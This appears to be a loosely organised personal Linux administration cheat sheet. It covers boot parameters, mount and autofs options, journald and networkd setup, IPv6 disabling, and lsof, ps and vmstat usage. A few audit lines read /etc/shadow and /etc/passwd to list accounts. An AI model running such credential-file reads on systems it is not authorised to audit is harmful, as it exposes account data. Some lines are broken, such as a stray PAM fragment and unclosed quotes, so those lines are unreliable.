suid 					setuid bits are allowed to take effect on this file system.
nosuid 					setuid bits are not allowed to take effect on this file system.
user 					Normal users can mount this device.
nouser 					Only root users can mount this device.
owner 					Allows the owner of the device to mount the file system.
ro 						File system will be mounted read-only.
rw 						File system will be mounted read-write.
defaults 				default options as rw, suid, dev, exec, auto, nouser, and async.
fscontext				Provide SELinux security context to those file systems without one.
group 					Users that belong to the device’s group can mount it
nomodeset 				Disable Kernel mode setting.
systemd.unit=rescue 	Boot to single­user mode (root).
systemd.unit=multi­ user Boot to a specified runlevel.
init=/bin/sh 			Boot to shell.
initrd= 				Specify the location of the initial ramdisk.
root= 					Root filesystem.

		

noeject						Do NOT eject CD after halt
noprompt					Do NOT prompt to remove the CD
splash						Boot with fancy background splashscreen
desktop=|beryl|fluxbox|		
	|gnome|icewm|kde|
	|lg3d|larswm|twm|
	|openbox|wmaker|
	|xfce|xfce4|



bootfrom=/dev/hda1/Knoppix.iso

screen=1280x1024 			Use specified screen resolution for X
depth=16 					Use specified color depth for X


xvrefresh=60 (or vsync=60) 		Use 60 Hz vertical refresh rate for X
xhrefresh=80 (or hsync=80) 		Use 80 kHz horizontal refresh rate for X



xmodule=ati						Use specified Xorg module
	|fbdev|mga|nv|
	|radeon|savage|
	|svga|i810|s3| 
		
		
wheelmouse				Enable IMPS/2 protocol for wheel mice
nowheelmouse			Force plain PS/2 protocol for PS/2 mouse
vga=normal				No-frame-buffer mode, but X
fb1280x1024				Use fixed frame-buffer graphics (1)
fb1024x768				Use fixed frame-buffer graphics (2)
fb800x600				Use fixed frame-buffer graphics (3)

xmodule=fbdev to use the same framebuffer support for X that you use In the
console.

mem=256M				ell the Linux kernel to use 256 MB of
RAM, despite what the BIOS might claim




noacpi
noapic
noagp				Skip parts of hardware detection
noapm
noaudio
noddc
nofirewire
noisapnpbios
nopcmcia
noscsi
noswap
nousb

Failsafe				Boot with (almost) no hardware detection
pci=bios				Workaround for bad PCI controllers
mem=128M				Specify memory size In megabytes
dma						Enable DMA for all IDE drives
noideraid				Disable IDE RAID detection



lang=us							Specify language/keyboard
>> |cn|de|da|pl|
>> |ies|fr|t|nl|
>> |ru|sk|tr|tw|
		 
keyboard=us Use a different console keyboard
xkeyboard=us Use a different X keyboard
tz=America/Los_Angeles Use a particular time zone



access=ACCESS
console=TTY,SPEED
debug
fetch=URL
hostname=HOSTNAME
username=USER
userfullname=USERFULLNAME
integrity-check
ip=[CLIENT_IP]:[SERVER_IP]:[GATEWAY_IP]:[NETMASK]:[HOSTNAME]:[DEVICE]:[AUTOCONF]  [,[CLIENT_IP]:[SERVER_IP]:[GATEWAY_IP]:[NETMASK]:[HOSTNAME]:[DEVICE]:[AUTOCONF]]*
ip[=frommedia]
{keyb|kbd-chooser/method}=KEYBOARD
{klayout|console-setup/layoutcode}=LAYOUT
{kvariant|console-setup/variantcode}=VARIANT
{kmodel|console-setup/modelcode}=CODE
koptions=OPTIONS
live-getty
{live-media|bootfrom}=DEVICE
{live-media-encryption|encryption}=TYPE
live-media-offset=BYTES
live-media-path=PATH
live-media-timeout=SECONDS
{locale|debian-installer/locale}=LOCALE
module=NAME
netboot[=nfs|cifs]
nfsopts=
noautologin
noxautologin
nofastboot
nopersistent
nosudo
swapon
nouser
noxautoconfig
persistent[=nofiles]
persistent-path=PATH
{preseed/file|file}=FILE
package/question=VALUE
quickreboot
showmounts
timezone=TIMEZONE
todisk=DEVICE
toram
union=aufs|unionfs
utc=yes|no
xdebconf
xvideomode=RESOLUTION



################################################################################################################
Rescue					Instead of installing, run the kernel to open Linux rescue mode.
mediacheck				Check the installation CD/DVD for checksum errors.
nofirewire 				Not to load support for frewire devices
nodma 					Not to load DMA support for hard disks
noide 					Not to load support for IDE devices
nompath 				Not to enable support for multipath devices
noparport 				Not to load support for parallel ports
nopcmcia 				Not to load support for PCMCIA controllers
noprobe 				Not to probe hardware, instead prompt user for drivers
noscsi  				Not to load support for SCSI devices
nousb 					Not to load support for USB devices
noipv6  				Not to enable IPV6 networking
nonet 					Not to probe for network devices
noquota					Do not set users quotas on this partition.
quota					Allow users quotas on this partition.
numa-off 				Disable the Non-Uniform Memory Access (NUMA) for AMD64 architecture
acpi=off 				Disable the Advanced Confguration and Power Interface (ACPI
xdriver=vesa 			Use standard vesa video driver
resolution=1024x768  	Choose exact resolution to use
nofb 				 	Don't use the VGA 16 framebuffer driver
skipddc 				Don't probe DDC of the monitor (the probe can hang the installer)
graphical 				Force a graphical installation
################################################################################################################



##########################################################################
Mount 					options unique to the isofs filesystem
##########################################################################
_________________________________________________________________________
block=512 			{+} Set the block size for the disk to 512 bytes
_________________________________________________________________________
block=1024			{+} Set the block size for the disk to 1024 bytes
_________________________________________________________________________
block=2048			{+} Set the block size for the disk to 2048 bytes
_________________________________________________________________________
check=relaxed 		{+} Matches filenames with different cases
_________________________________________________________________________
check=strictMatches 	{+} only filenames with the exact same case
_________________________________________________________________________
cruft 				{+} Try to handle badly formatted CDs.
_________________________________________________________________________
map=off 			{+} Do not map non-Rock Ridge filenames to lower case
_________________________________________________________________________
map=normal			{+} Map non-Rock Ridge filenames to lower case
_________________________________________________________________________
map=acorn 
map=normal  		{+} but also apply Acorn extensions if present
_________________________________________________________________________
mode=xxx 			{+} Sets the permissions on files to xxx unless Rock Ridge
						extensions set the permissions otherwise
_________________________________________________________________________
dmode=xxx 			{+} Sets the permissions on directories to xxx unless Rock Ridge
						extensions set the permissions otherwise
_________________________________________________________________________
overriderockperm 	{+} Set permissions on files and directories according to
						'mode' and 'dmode' even though Rock Ridge extensions are
						present.
_________________________________________________________________________
nojoliet			{+} Ignore Joliet extensions if they are present.
_________________________________________________________________________
norock				{+} Ignore Rock Ridge extensions if they are present.
_________________________________________________________________________
hide				{+} Completely strip hidden files from the file system.
_________________________________________________________________________
showassoc			{+} Show files marked with the 'associated' bit
_________________________________________________________________________
unhide				{+} Deprecated; showing hidden files is now default;
						If given, it is a synonym for 'showassoc' which will
						recreate previous unhide behavior
_________________________________________________________________________
session=x 			{+} Select number of session on multisession CD
_________________________________________________________________________
sbsector=xxx		{+} Session begins from sector xxx




#######################################################################################

#######################################################################################
__________________________________________________________________________________
acpi=on         This loads support for ACPI and also causes the acpid daemon to
                be started by the CD on boot.  This is only needed if your
                system requires ACPI to function properly.  This is not
                required for Hyperthreading support.
__________________________________________________________________________________#
acpi=off        Completely disables ACPI.  This is useful on some older systems
                and is also a requirement for using APM.  This will disable any
                Hyperthreading support of your processor.
__________________________________________________________________________________
console=X       This sets up serial console access for the CD.  The first
                option is the device, usually ttyS0 on x86, followed by any
                connection options, which are comma separated.  The default
                options are 9600,8,n,1.
__________________________________________________________________________________
dmraid=X        This allows for passing options to the device-mapper RAID
                subsystem.  Options should be encapsulated In quotes.
__________________________________________________________________________________
doapm           This loads APM driver support.  This requires you to also use
                acpi=off.
__________________________________________________________________________________
dopcmcia        This loads support for PCMCIA and Cardbus hardware and also
                causes the pcmcia cardmgr to be started by the CD on boot.
                This is only required when booting from PCMCIA/Cardbus devices.
__________________________________________________________________________________
doscsi          This loads support for most SCSI controllers.  This is also a
                requirement for account    required    pam_unix.sobooting most USB devices, as they use the SCSI
                subsystem of the kernel.
__________________________________________________________________________________
hda=stroke      This allows you to partition the whole hard disk even when your
                BIOS is unable to handle large disks.  This option is only used
                on machines with an older BIOS.  Replace hda with the device
                that is requiring this option.

__________________________________________________________________________________
ide=nodma       This forces the disabling of DMA In the kernel and is required
                by some IDE chipsets and also by some CDROM drives.  If your
                system is having trouble reading from your IDE CDROM, try this
                option.  This also disables the default hdparm settings from
                being executed.
__________________________________________________________________________________
noapic          This disables the Advanced Programmable Interrupt Controller
                that is present on newer motherboards.  It has been known to
                cause some problems on older hardware.
__________________________________________________________________________________
nodetect        This disables all of the autodetection done by the CD,
                including device autodetection and DHCP probing.  This is
                useful for doing debugging of a failing CD or driver.
__________________________________________________________________________________
nodhcp          This disables DHCP probing on detected network cards.  This is
                useful on networks with only static addresses.
__________________________________________________________________________________
nodmraid        Disables support for device-mapper RAID, such as that used for
                on-board IDE/SATA RAID controllers.
__________________________________________________________________________________
nofirewire      This disables the loading of Firewire modules.  This should
                only be necessary if your Firewire hardware is causing
                a problem with booting the CD.
__________________________________________________________________________________
nogpm           This diables gpm console mouse support.
__________________________________________________________________________________
nohotplug       This disables the loading of the hotplug and coldplug init
                scripts at boot.  This is useful for doing debugging of a
                failing CD or driver.
__________________________________________________________________________________
nokeymap        This disables the keymap selection used to select non-US
                keyboard layouts.
__________________________________________________________________________________
nolapic         This disables the local APIC on Uniprocessor kernels.
__________________________________________________________________________________
nosata          This disables the loading of Serial ATA modules.  This is used
                if your system is having problems with the SATA subsystem.
__________________________________________________________________________________
nosmp           This disables SMP, or Symmetric Multiprocessing, on SMP-enabled
                kernels.  This is useful for debugging SMP-related issues with
                certain drivers and motherboards.
__________________________________________________________________________________
nosound         This disables sound support and volume setting.  This is useful
                for systems where sound support causes problems.
__________________________________________________________________________________
nousb           This disables the autoloading of USB modules.  This is useful
                for debugging USB issues.
__________________________________________________________________________________
slowusb         This adds some extra pauses into the boot process for slow
                USB CDROMs, like In the IBM BladeCenter.
__________________________________________________________________________________


preseed/url=https://www.kali.org/dojo/preseed.cfg		allows us to preseed Kali installations securely over SSL.



irqpoll			if some driver hang with irq problem messages


#########################################################################################
#########################################################################################



no3d 
noaudio 
noapm 
noapic 
nolapic
acpi=off 
pci=bios 
pnpbios=off 
nodma 
nopcmcia 
noscsi 
nousb


## ============================================================================================= ##
												PCI
## ============================================================================================= ##
________________________________________________________________________________________________
pci=off				Dont use PCI
________________________________________________________________________________________________
pci=conf1			Use conf1 access.
________________________________________________________________________________________________
pci=conf2			Use conf2 access.
________________________________________________________________________________________________
pci=rom				Assign ROMs.
________________________________________________________________________________________________
pci=assign-busses	Assign busses
________________________________________________________________________________________________
pci=irqmask=MASK	Set PCI interrupt mask to MASK
________________________________________________________________________________________________
pci=lastbus=NUMBER	Scan up to NUMBER busses, no matter what the mptable says.
________________________________________________________________________________________________
pci=noacpi			Dont use ACPI to set up PCI interrupt routing.
## ============================================================================================= ##


################################################################################################
############################ || ===>	  SELinux			<=== || ############################
################################################################################################
checkreqprot= [ 0 | 1 ]						Set the initial checkreqprot flag value. 0 means that the check
											protection will be applied by the kernel and will include any
											implied execute protection. 1 means that the check protection is
											requested by the application.
________________________________________________________________________________________________
enforcing= [ 0 | 1 ]						Specify whether SELinux enforces its rules upon boot. 0 means that
											SELinux will just log policy violations but will not deny access to
											anything. 1 means that the enforcement will be fully enabled with
											denials as well as logging. The default value is 0 .
________________________________________________________________________________________________
selinux= [ 0 | 1 ]							allows SELinux to be enabled ( 1 ) or disabled ( 0 )
________________________________________________________________________________________________
selinux_compat_net= [ 0 | 1 ]				Set the network control model.
#################################################################################################

systemd.mount


awk '/^\// { print $1 }' /etc/fstab
awk '/^\// { print $1 }' /proc/mounts
awk '/^[^#]/ { printf " " substr($3, 2) }' /proc/mounts; echo -n ' '
awk '/^[^#]/ { printf " " substr($1,2,length($1)-2) }' /proc/mounts; echo -n ' '





Direct maps - in autofs provide a mechanism to automatically mount file systems at
arbitrary points in the file system hierarchy. A direct map is denoted by a mount point of /-
in the master map. Entries in a direct map contain an absolute path name as a key (instead
of the relative path names used in indirect maps).




Built-in Map The built-in map file is triggered by having 
    -hosts 
in a master map’s map-name field.

(This is sometimes called lazy mounting, but built-in mapping sounds better.)

A typical built-in map entry in the master map file looks like this:
/net    -hosts





The /etc/auto.master file is the main configuration file for autofs.


/etc/auto.smb and /etc/auto.net


the /etc/auto.servers file controls the /remote mount point.
After a server is mounted, 
it will be unmounted after 60 seconds (the timeout value).


add this to /etc/auto.master :
/remote	/etc/auto.servers --timeout=60

You must now create the /etc/auto.servers file, 
which specifies subdirectories and the servers to which they connect to:


music						louis.example.com:/home/armstrong/music
research	-fstype=nfs4	albert.example.com:/home/einstein/data


The first line uses NFS defaults
the second adds an option that forces use of NFSv4


the SMB/CIFS security model requires a username and a password
the auto.smb file delivered with most distributions lacks 
support for this basic SMB/CIFS requirement.

• /etc/auto.master
• /etc/auto.[dir]



echo "The /etc/init.d/autofs script"
echo "   first looks at:"
echo " • /etc/auto.master"



# sample /etc/auto.master file
/var/autofs/floppy /etc/auto.floppy --timeout=2
/var/autofs/cdrom /etc/auto.cdrom --timeout=6




/etc/auto.master

mount /dev/fd0 on /var/autofs/floppy/floppy

# sample /etc/auto.floppy file
floppy -user,fstype=auto :/dev/fd0




configure /etc/auto.misc to mount local hardware devices.

boot	-fstype=ext2	:/dev/hda1
floppy	-fstype=auto	:/dev/fd0

make sure to reference /etc/auto.misc in /etc/auto.master
To have the file booted at mount time.



To unmount the filesystem, after a period of inactivity 
add --timeout parameter in /etc/auto.master



/etc/init.d/autofs reload




cat /etc/systemd/systemd/mnt.mount






echo "##-==========================================-##"
echo "   [+] List all users In the passwd file:	 	 "
echo "##-==========================================-##"
cat /etc/passwd | cut -d: -f1		# List of users



echo "##-========================================================-##"
echo "   [+] Get a list of all unlocked (encryptable) accounts:		"
echo "##-========================================================-##"
egrep -v '.*:\*|:\!' /etc/shadow | awk -F: '{print $1}'



echo "##-====================================================================-##"
echo "   [+] List all accounts that do not have a 'x' In the password field:	"
echo "##-====================================================================-##"
grep -v ':x:' /etc/passwd








chpasswd --crypt-method SHA512 --sha-rounds 5000







## Journaling is a method that tracks uncommitted (file metadata not yet updated) 
## data changes in a log file, called a journal. 
## If the data commitment process is interrupted, 
## say by a system crash, the journal is used to commit the intended data changes.





journalctl -f -u hello.service


systemd-journald




echo "display journal messages"
journalctl --list-boots | head





mkdir /var/log/journal
chgrp systemd-journal /var/log/journal
chmod 2775 /var/log/journal
systemctl restart systemd-journald.service
setfacl -Rnm g:wheel:rx,d:g:wheel:rx,g:adm:rx,d:g:adm:rx /var/log/journal/






Enabling persistent logging In journald
=======================================

To enable persistent logging, create /var/log/journal:

mkdir -p /var/log/journal
systemd-tmpfiles --create --prefix /var/log/journal

systemd will make the journal files owned by the "systemd-journal" group and
add an ACL for read permissions for users In the "adm" group





Boot with these kernel command line options:
systemd.log_level=debug systemd.log_target=kmsg log_buf_len=1M




systemctl enable systemd-networkd


use networkd together with systemd-resolved(8) to
dynamically manage /etc/resolv.conf:

  systemctl enable systemd-resolved
  ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf-----------------------=====================================-





networkd supports disabling IPv6 on a per-interface basis. 
When a network units `[Network]` section has either 

`LinkLocalAddressing=ipv4` 
			or 
`LinkLocalAddressing=no` 

networkd will not try to configure IPv6 on the matching interfaces.



However, networkd will still be expecting to receive router advertisements if IPv6 is not disabled globally. 
If IPv6 traffic is not being received by the interface (e.g. due to `sysctl` or `ip6tables` settings), 
it will remain In the `configuring` state and potentially cause timeouts for services waiting 
for the network to be fully configured. 

To avoid this, the 

`IPv6AcceptRA=no` 

option should also be set In the `[Network]` section.


[Network]
LinkLocalAddressing=no
IPv6AcceptRA=no




ipv6.disable=1



echo -n "Disable IPv6... "


sed -i '/^#options ipv6 disable=1/ c\options ipv6 disable=1' $BLACKLIST

sed -i '/^#net.ipv6.conf.all.disable_ipv6 = 0/ c\net.ipv6.conf.all.disable_ipv6 = 1' /etc/sysctl.conf
		  
		  
		  
echo "NETWORKING_IPV6=no" >> /etc/sysconfig/network		  
sed -i 's/NETWORKING_IPV6=yes/NETWORKING_IPV6=no/g' /etc/sysconfig/network




sed -i "/IPV6INIT/s/yes/no/" /etc/sysconfig/network

sed -i "/IPV6INIT/s/yes/no/" /etc/sysconfig/network-scripts/ifcfg*




rmmod ipv6 &>/dev/null
service ip6tables stop &>/dev/null
chkconfig ip6tables off &>/dev/null

logger "Disabled IPv6 Support (system-hardening)"
echo "Done."












		echo -n "Enable udf (DVD) filesystem... "
		sed -i '/^install udf \/bin\/false/ c\#install udf \/bin\/false' $BLACKLIST
		logger "Enabled UDF/DVD Support (system-hardening)"
		echo "Done."
	else
		echo -n "Disable udf (DVD) file system... "
		sed -i '/^#install udf \/bin\/false/ c\install udf \/bin\/false' $BLACKLIST
		logger "Disabled UDF/DVD Support (system-hardening)"
		echo "Done."



		  
		  
		  



### Enable debugging manually

mkdir -p /etc/systemd/system/systemd-networkd.service.d/

Create the following file:

touch /etc/systemd/system/systemd-networkd.service.d/10-debug.conf


echo "[Service]" > /etc/systemd/system/systemd-networkd.service.d/10-debug.conf
echo "Environment=SYSTEMD_LOG_LEVEL=debug" >> /etc/systemd/system/systemd-networkd.service.d/10-debug.conf


systemctl daemon-reload
systemctl restart systemd-networkd
journalctl -b -u systemd-networkd





To see all runtime drop-in changes for system units run the command below:

systemd-delta --type=extended





Remove ACLs from Library Files


getfacl --skip-base $LIBFILE 2>/dev/null

#Check that system libraries have no extended ACLs.
# ls -lL /usr/lib/* /lib/* | grep "+ "
#If the permissions include a '+', the file has an extended ACL this is a finding.


Remove the extended ACL from the file.
# setfacl --remove-all /usr/lib/* /lib/*   



$ setfacl -m u:root:ro /etc/
$ setfacl -m d:g:root:ro /mnt/poo

$ setfacl -m g:users:rw /etc/

$ getfacl /root/.profile

$ mkdir --mode=0644 /mnt/poo
$ setfacl -m d:g:root:ro /mnt/poo


echo "(+)========================================================(+)"
echo "    {♦} 		"
echo "(+)========================================================(+)"



echo "(+)========================================================(+)"
echo "    {♦} Specify a FAT32 file system via the -F 32 option.		"
echo "    ♦ Use the -n option to label the partition				"
echo "(+)========================================================(+)"

 ♦ Specify that you want a FAT32 file system via the -F 32 option.
 ♦ 
 
mkfs.vfat -n "USB Key" -F 32 /dev/sdg1








mount -t vfat -o acl,ro,nosuid /dev/sda /mnt/poo




mount -n /dev/sda				## dont write to the /etc/mtab file




grep vg_ /etc/fstab

lvdisplay 

# mkdir /mnt/cdrom
# mount -o loop,ro /media/kali.iso /mnt/cdrom



mount /tmp/disk.img /mnt -o loop

mount /tmp/disk.img /mnt

mount -t ext3 /tmp/disk.img /mnt


-o acl
-o user_xattr
-o debug




/etc/mke2fs.conf

mke2fs -O journal_dev external-journal





200.1 Measure and troubleshoot resource usage:



Memory (also called RAM) is divided into 4 Kb chunks called pages.


swapping - If the idle process is no longer idle, 
		   its memory pages are copied back into memory.


vmstat - view disk I/O specific to swapping.
		 as well as total blocks in and blocks out to the device.




I/O blocking - if a disk is experiencing unusually high I/O, 
               it may be due to a particular process and it may be
               causing a group of processes performance troubles.

uninterruptible sleep - 

[?] vmstat utility’s 'b column' displays how many processes are in this state

[?] use the ps utility and look for a D process state



ps 



the difference between ps -ef and just ps -e are these columns:
UID PID  PPID  C STIME

ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 10:38 ?        00:00:02 /sbin/init nosuid noipv6 nonet kalsr
root         2     0  0 10:38 ?        00:00:00 [kthreadd]
root         4     2  0 10:38 ?        00:00:00 [kworker/0:0H]
root         6     2  0 10:38 ?        00:00:00 [mm_percpu_wq]
root         7     2  0 10:38 ?        00:00:00 [ksoftirqd/0]

ps -e
  PID TTY          TIME CMD
    1 ?        00:00:02 systemd
    2 ?        00:00:00 kthreadd
    4 ?        00:00:00 kworker/0:0H
    6 ?        00:00:00 mm_percpu_wq



first column - shows the process ID (PID) of the process.

third column - shows the current status of the process 

				| S  | sleeping
				| SW | sleeping and waiting
				| R  | running


Processes that are in brackets have been swapped out of memory
to the disk swap space due to inactivity.


pstree

## show current process
pstree -h

## show process IDs
pstree -h -p

## show SELinux processes:
pstree -Z

## show the commands passed to the process"
pstree -a




-r, --route              display routing table
-s, --statistics         display networking statistics (like SNMP)

netstat -p		## display PID/Program name for sockets
-c, --continuous         continuous listing
-l, --listening          display listening server sockets





echo "(+)========================================================(+)"
echo "   [+] 			"
echo "(+)========================================================(+)"

10 largest files:

```
$ du -a | sort -rn | head -10




echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"


Finding Listening Sockets

lsof -i


echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

Finding a Particular Network Connection

lsof -iTCP@aaa.bbb.ccc:ftp-data


echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

particular IP version -- IPv4 or IPv6
lsof -i4
lsof -i6



echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

Identifying a Netstat Connection
lsof -iTCP@ipscgate:login



netstat -A

lsof -i | grep 10144168

echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

If the file is a UNIX socket
netstat -a -f unix

  Active UNIX domain sockets
  Address  Type          Vnode     Conn  Local Addr      Remote Addr
  ffffff0084253b68 stream-ord 0000000 0000000



echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

output piped to a grep on the address
lsof -U | grep ffffff0084253b68


echo "(+)========================================================(+)"
echo "   [+] 	"
echo "(+)========================================================(+)"

look up the PID of the process running

lsof -p <PID>



echo "(+)========================================================(+)"
echo "   [+] output every process running with the name sendmail	"
echo "(+)========================================================(+)"
lsof -c sendmail







lsof -p7362

## ############################################################################################################################### ##
##-===============================================================================================================================-##
## 		COMMAND     PID     USER   FD   TYPE     DEVICE   SIZE/OFF  INODE NAME
## 		...
## 		in.rlogin  7362     root    0u  inet 0xfc0193b0      0t242    TCP klaatu.cc.purdue.edu:login->lsof.itap.purdue.edu:1023
## 		...
## 		in.rlogin  7362     root    3u  VCHR    23,   0       0t66  52928 /devices/pseudo/clone@0:ptmx->pckt->ptm
##-===============================================================================================================================-##
## ############################################################################################################################### ##




echo "(+)=================================(+)"
echo "   [+] understanding pseudo-ttys		 "
echo "(+)=================================(+)"
the DEVICE column for FD 3, 
the major/minor device number of 23,0.  
This translates to /dev/pts/0







lsof /dev/pts/0

## ############################################################################################################################### ##
##-===============================================================================================================================-##
## 		COMMAND     PID     USER   FD   TYPE     DEVICE   SIZE/OFF  INODE NAME
## 		 ksh        7364      abe    0u  VCHR    24,   0     0t2410  53410 /dev/pts/../../devices/pseudo/pts@0:0
##-===============================================================================================================================-##
## ############################################################################################################################### ##

shows In part that login abe has a ksh process on /dev/pts/0


lsof /dev/pty/ttys0

echo "(+)=========================================(+)"
echo "   [+] list all files open on a NFS server	 "
echo "(+)======================================= =(+)"

lsof -N


echo "(+)=============================================(+)"
echo "    [+] Listing Files Open by a Specific Login	 "
echo "(+)=============================================(+)"
    $ lsof -u<login>
  or
    $ lsof -u<User ID number>




Ignoring a Specific Login
=============================

lsof ignore the files open to system processes, owned by the root (UID 0) login


lsof -u ^root
    or
lsof -u ^0




Listing Files Open to a Specific Process Group
==================================================

assuming the process group ID number is 12717:

lsof -g12717 -adcwd



B.  Output Options
==================

  Lsof has these options to control its output format:

	-F	produce output that can be parsed by a subsequent
		program.

	-g	print process group (PGID) IDs.

	-l	list UID numbers instead of login names.

	-n	list network numbers instead of host names.

	-o	always list file offset.

	-P	list port numbers instead of port service names.

	-s	always list file size.



















lsof /dev/kmem         # kernel virtual memory device
lsof /dev/mem          # physical memory device
lsof /dev/swap         # system paging device
lsof /dev/sda



lsof /var/run/utmp
lsof +d /var/log



* To see open TCP ports:

```
$ lsof | grep TCP
```

* To see IPv4 port(s):

```
$ lsof -Pnl +M -i4
```

* To see IPv6 listing port(s):

```
$ lsof -Pnl +M -i6






echo -e "\t## ============================================================================ ##"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t## ========================== PS - Process Monitor ============================ ##"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t## ============================================================================ ##"





# Discover the process start time
ps -eo pid,lstart,cmd






ps -e -o pid,args --forest	








awk '{ print $1, $5 }' /proc/net/dev




The kernel assigns each process a symbolic link per namespace kind In /proc/<pid>/ns/

The inode number pointed to by this symlink is the same for each process In this namespace. This uniquely identifies each namespace by the inode number pointed to by one of its symlinks.


Three syscalls can directly manipulate namespaces:

    clone, flags to specify which new namespace the new process should be migrated to.
    unshare, flags to specify which new namespace the current process should be migrated to.
    setns, enters the namespace specified by a file descriptor.







vmstat 1 5 						# Print a report every second, for 5 times

iostat -dx 1 5  				# Print a detailed report for all devices every second, for 5 times

mpstat  						# Print a report about processor activities

mpstat 1 5  					# Print a report of global statistics among all processors every second, for 5 times
mpstat -P ALL 2 5
htop

iotop

powertop








The si and so columns In the swap group display the amount of swap memory that is being
read from (si—swap in) and written to (so—swap out) your swap space. The wa column In the
cpu group tells you the percentage of time the CPU is waiting for data—and thus not processing
instructions.



echo "##-================================-##"
echo "   [+] vmstat - Swap Activity			"
echo "##-================================-##"
echo
echo "##--------------------------------------------------------##"
echo "   [?] By passing a second number as parameter, 
echo "       We’ve told vmstat to quit after 5 intervals.
echo "##--------------------------------------------------------##"

vmstat -n 5




echo "##-============================-##"
echo "    [+] vmstat - I/O Activity		"
echo "##-============================-##"

vmstat 5 5




If a host is spending most of its CPU cycles moving applications from and to swap space, the
si and so column values will be high. The actual values will depend on the amount of swapping
that is occurring and the speed of your swap device.


The vmstat utility will also give us information on how much data is being read from and
written to disk. 



Pay special attention to these two fields In the io group of vmstats output:

 • bi (blocks in) 
 • bo (blocks out) 


These two numbers tell you exactly how many blocks of data are being read from (bi) and
written to (bo) your disks during each interval




Checking Disk I/O Performance







The if=/dev/zero uses the zero device file to write zeros to the disk. 
The count option is added so that this action is completed 10 times 
in order to zero-out the disk thoroughly.




dd if=/dev/zero of=./largefile bs=1M count=1024 &

[1] 21835

vmstat 5 5



/etc/collectd/collectd.conf			## Daemon configuration file

## Amount of time to wait between queries for collectd statistics 
## is defined by the INTERVAL value in the config file

ckconfig collectd on

/usr/share/collectd/types.db
• Contains one line for each data-set specification, consisting of two field delimited by space
or tabs
• First field defines the name of the data-set
• Second field defines the list of data-source specifications (space or comma delimited)












irqbalance - distributes interrupt requests among the system’s multiple processors



iotop - shows current I/O Dynamic Device usage by processes (or threads).


iostat - Shows device I/O loading summary broken down Static or CPU per device.

iftop - shows network traffic information, including DNS.


lsof - Shows open files and network connections by process.


mpstat - Shows multiple processor statistics.

mtr - Shows routing information for the URL parameter.

ntop - Gathers network statistics that can be viewed via Dynamic a web browser via port 3000.


ss - Displays socket statistics directly from kernel



uptime - Shows how long the system has gone without a reboot, load averages, and current number of
reboot, load averages, and current number of users.


vmstat - Shows swap (virtual memory) performance.

w - Shows current user information, including CPU consumption.
w -s 			## Short format display
w -i			## Display IP address instead of hostname of connection (if possible)
w xe1phix		## Display information on indicated user only


nload - 



lsof | head -10			## Provides the top ten files that are open

lsof | wc -l			## Provides a count of the total number of open files on run

lsof -u root			## Display open file statistics for that particular user


An SSD stores data in blocks, 
which are further subdivided into pages.
Data is written at the lower page level, 
but is erased at the higher block level.


the old data is moved into a buffer, 
deleted (at the block level), and 
then the old buffered data is written 
along with any new or modified data (at the page level).


write amplification:
more data is erased and rewritten on an SSD filesystem than each modification requested.


fstrim - defragments all of the free blocks within the  designated filesystem.



## No response from the command means that TRIM is not supported.
hdparm -I /dev/sda | grep TRIM





Non-Volatile Memory Express (
)


NVME specification introduces the concept of namespaces



## The 0 in the device file name indicates that this is the first NVMe drive.
## The p1 denotes that this is partition 1 within this drive’s namespace one.

## the partition is a subdivision of the namespace.
/dev/nmve0n1p1


## refer to a 
## 2nd NMVe drive’s
## 3rd namespace 
## and 2nd partition:
## /dev/nvme1n3p2


## check the number of namespaces supported and used
nvme id-ctrl /dev/nvme1 -H


Retrieve the geometry from nvme0
nvme lnvm-id-ns /dev/nvme0 -n 1





Optional Admin Command Support (OACS)


Number of Namespaces field ( nn ) shows the number of namespaces on the
controller


## check the size of the namespace
nvme id-ns /dev/nvme0n1


## check HD for multiple namespaces:
nvme list-ns /dev/nvme1


## list the attached NVMe devices:
nvme list



mmls /dev/nvme1n1



## extract the SMART log 
nvme smart-log /dev/nvme1


Print the raw SMART log to a file:
nvme smart-log /dev/nvme0 --raw-binary > smart_log.raw


USB Attached SCSI Protocol (UASP).













Information On A Certain Processes Limits

echo "the SCSI IO subsystem status"
cat -vET /proc/scsi >>  $TEMP_DIR/SCSI.txt && cat -vET $TEMP_DIR/SCSI.txt
echo "listing of all SCSI devices known to the kernel"
cat -vET /proc/scsi/scsi >>  $TEMP_DIR/SCSI-devices.txt && cat -vET $TEMP_DIR/SCSI-devices.txt
echo "system-wide limit on the total number of pages of  System  V shared memory."
cat -vET /proc/sys/kernel/shmall >>  $TEMP_DIR/shmall.txt && cat -vET $TEMP_DIR/shmall.txt
echo "determines whether kernel addresses are exposed via /proc files and other interfaces"
cat -vET /proc/sys/kernel/kptr_restrict >>  $TEMP_DIR/kptr_restrict.txt && cat -vET $TEMP_DIR/kptr_restrict.txt
echo "flag that controls the L2 cache of G3 processor boards"
cat -vET /proc/sys/kernel/l2cr >>  $TEMP_DIR/L2-cache.txt && cat -vET $TEMP_DIR/L2-cache.txt
echo "path to the kernel module loader"
cat -vET /proc/sys/kernel/modprobe >>  $TEMP_DIR/modprobe.txt && cat -vET $TEMP_DIR/modprobe.txt
echo "values representing the console_loglevel"
cat -vET /proc/sys/kernel/printk >>  $TEMP_DIR/printk.txt && cat -vET $TEMP_DIR/printk.txt
echo "number of UNIX 98 pseudoterminals"
cat -vET /proc/sys/kernel/pty >>  $TEMP_DIR/pty.txt && cat -vET $TEMP_DIR/pty.txt
echo "defines the maximum number of pseudoterminals"
cat -vET /proc/sys/kernel/pty/max >>  $TEMP_DIR/pty-max.txt && cat -vET $TEMP_DIR/pty-max.txt
echo "how many pseudoterminals are currently being use"
cat -vET /proc/sys/kernel/pty/nr >>  $TEMP_DIR/pty-nr.txt && cat -vET $TEMP_DIR/pty-nr.txt
echo "size of the generic SCSI device (sg) buffer"
